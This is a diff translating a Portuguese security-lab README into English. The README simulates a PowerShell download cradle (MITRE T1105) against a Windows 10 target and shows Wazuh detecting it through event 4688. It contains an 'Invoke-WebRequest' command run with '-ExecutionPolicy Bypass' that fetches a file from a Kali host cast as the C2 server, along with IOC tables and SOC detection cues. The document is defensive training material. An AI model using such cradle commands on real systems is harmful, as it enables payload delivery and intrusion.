@@ -7,15 +7,15 @@
 
 ---
 
-## Objetivo
+## Objective
 
-Simular um download cradle via PowerShell, técnica amplamente usada por atacantes para transferir ferramentas ou payloads de um servidor externo para a máquina alvo, e detectar o comportamento através do Wazuh SIEM.
+Simulate a PowerShell download cradle, a technique widely used by attackers to transfer tools or payloads from an external server to the target machine, and detect the behavior through Wazuh SIEM.
 
 ---
 
-## Ambiente do Lab
+## Lab Environment
 
-| Máquina | Role | IP |
+| Machine | Role | IP |
 |---|---|---|
 | Kali Linux | Attacker / C2 Server | 192.168.56.104 |
 | Windows 10 | Target | — |
@@ -23,22 +23,22 @@ Simular um download cradle via PowerShell, técnica amplamente usada por atacant
 
 ---
 
-## Explicação Técnica
+## Technical Background
 
-Um **download cradle** é um comando curto executado diretamente na memória ou via linha de comando que faz o download de um arquivo ou script remoto e o executa ou salva localmente. É uma das técnicas mais utilizadas na fase de Command & Control e Execution de uma kill chain.
+A **download cradle** is a short command executed directly in memory or via command line that downloads a remote file or script and executes or saves it locally. It is one of the most commonly used techniques during the Command & Control and Execution phases of a kill chain.
 
-Neste lab, o atacante:
-1. Hospeda um arquivo em um servidor HTTP simples no Kali
-2. Executa um comando PowerShell no Windows com `Invoke-WebRequest` para baixar o arquivo
-3. O Wazuh captura o Event ID 4688 com os argumentos completos da linha de comando, expondo o comportamento
+In this lab, the attacker:
+1. Hosts a file on a simple HTTP server on Kali
+2. Executes a PowerShell command on Windows using `Invoke-WebRequest` to download the file
+3. Wazuh captures Event ID 4688 with the full command-line arguments, exposing the behavior
 
-O indicador crítico de detecção é o campo `commandLine` do evento 4688, que registra o processo `powershell.exe` sendo iniciado com flags suspeitas (`-ExecutionPolicy Bypass`) e uma URL apontando para um host externo.
+The critical detection indicator is the `commandLine` field of event 4688, which records the `powershell.exe` process being launched with suspicious flags (`-ExecutionPolicy Bypass`) and a URL pointing to an external host.
 
 ---
 
-## Passo a Passo do Ataque
+## Attack Walkthrough
 
-### 1. Preparar o servidor HTTP no Kali
+### 1. Set up the HTTP server on Kali
 
 ```bash
 echo "simulation - download cradle test" > /tmp/payload.txt
@@ -46,13 +46,13 @@ cd /tmp
 python3 -m http.server 8080
 ```
 
-O servidor HTTP simula a infraestrutura C2. O arquivo `.txt` mantém o foco na telemetria sem acionar antivírus.
+The HTTP server simulates C2 infrastructure. The `.txt` file keeps the focus on telemetry without triggering antivirus.
 
 ![Kali HTTP Server](images/01-kali-http-server.png)
 
 ---
 
-### 2. Confirmar o IP do Kali
+### 2. Confirm the Kali IP address
 
 ```bash
 ip a
@@ -62,21 +62,21 @@ ip a
 
 ---
 
-### 3. Executar o Download Cradle no Windows
+### 3. Execute the Download Cradle on Windows
 
-No Windows 10, abrir PowerShell e executar:
+On Windows 10, open PowerShell and run:
 
 ```powershell
 powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://192.168.56.104:8080/payload.txt' -OutFile 'C:\Users\Public\payload.txt'"
 ```
 
-O flag `-ExecutionPolicy Bypass` é um indicador clássico de abuso de PowerShell. A URL aponta diretamente para o servidor do atacante.
+The `-ExecutionPolicy Bypass` flag is a classic indicator of PowerShell abuse. The URL points directly to the attacker's server.
 
 ![PowerShell Execution](images/03-windows-powershell-execution.png)
 
 ---
 
-### 4. Confirmar o arquivo baixado
+### 4. Confirm the downloaded file
 
 ```powershell
 Get-Content C:\Users\Public\payload.txt
@@ -86,64 +86,64 @@ Get-Content C:\Users\Public\payload.txt
 
 ---
 
-### 5. Evento 4688 detectado no Wazuh
+### 5. Event 4688 detected in Wazuh
 
-No Wazuh Dashboard, o evento 4688 foi capturado com os seguintes campos relevantes:
+In the Wazuh Dashboard, event 4688 was captured with the following relevant fields:
 
 - `data.win.system.eventID: 4688`
 - `data.win.eventdata.newProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
-- `data.win.eventdata.commandLine`: contendo `Invoke-WebRequest` e o IP `192.168.56.104`
-- `data.win.eventdata.parentProcessName`: processo pai que iniciou o PowerShell
+- `data.win.eventdata.commandLine`: containing `Invoke-WebRequest` and the IP `192.168.56.104`
+- `data.win.eventdata.parentProcessName`: parent process that launched PowerShell
 
 ![Wazuh 4688 Event](images/05-wazuh-4688-event.png)
 
 ---
 
-### 6. Detalhes completos do evento
+### 6. Full event details
 
 ![Wazuh Event Details](images/06-wazuh-event-details.png)
 
 ---
 
-### 7. Requisição recebida no servidor Kali
+### 7. Request received on the Kali server
 
-O log do servidor HTTP confirmou a requisição GET originada do Windows:
+The HTTP server log confirmed the GET request originating from Windows:
 
 ```
-192.168.x.x - - [data hora] "GET /payload.txt HTTP/1.1" 200 -
+192.168.x.x - - [date time] "GET /payload.txt HTTP/1.1" 200 -
 ```
 
 ![Kali HTTP Request Received](images/07-kali-http-request-received.png)
 
 ---
 
-## Indicadores de Comprometimento (IOCs)
+## Indicators of Compromise (IOCs)
 
-| Indicador | Valor |
+| Indicator | Value |
 |---|---|
-| Processo | `powershell.exe` |
-| Flag suspeita | `-ExecutionPolicy Bypass` |
-| Método | `Invoke-WebRequest` |
-| Destino | `http://192.168.56.104:8080/payload.txt` |
-| Arquivo baixado | `C:\Users\Public\payload.txt` |
+| Process | `powershell.exe` |
+| Suspicious flag | `-ExecutionPolicy Bypass` |
+| Method | `Invoke-WebRequest` |
+| Destination | `http://192.168.56.104:8080/payload.txt` |
+| Downloaded file | `C:\Users\Public\payload.txt` |
 | Event ID | `4688` |
 
 ---
 
-## O que o SOC deve observar
+## What the SOC Should Look For
 
-- `powershell.exe` iniciado com `-ExecutionPolicy Bypass`
-- `commandLine` contendo `Invoke-WebRequest`, `iwr`, `wget` ou `curl` apontando para IPs externos
-- Download de arquivos em diretórios públicos como `C:\Users\Public\`
-- Processo filho de `powershell.exe` com argumentos de rede
-- Requisições HTTP para portas não convencionais (ex: 8080, 4444, 1337)
+- `powershell.exe` launched with `-ExecutionPolicy Bypass`
+- `commandLine` containing `Invoke-WebRequest`, `iwr`, `wget` or `curl` pointing to external IPs
+- Files downloaded to public directories such as `C:\Users\Public\`
+- Child processes of `powershell.exe` with network arguments
+- HTTP requests to non-standard ports (e.g., 8080, 4444, 1337)
 
 ---
 
-## Estrutura de Arquivos
+## File Structure
 
 ```
-lab-06-t1105-download-cradle/
+lab-06-download-cradle-T1105/
 ├── README.md
 └── images/
     ├── 01-kali-http-server.png
@@ -157,7 +157,7 @@ lab-06-t1105-download-cradle/
 
 ---
 
-## Referências
+## References
 
 - [MITRE ATT&CK T1105 — Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
 - [Windows Event ID 4688 — Process Creation](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688)
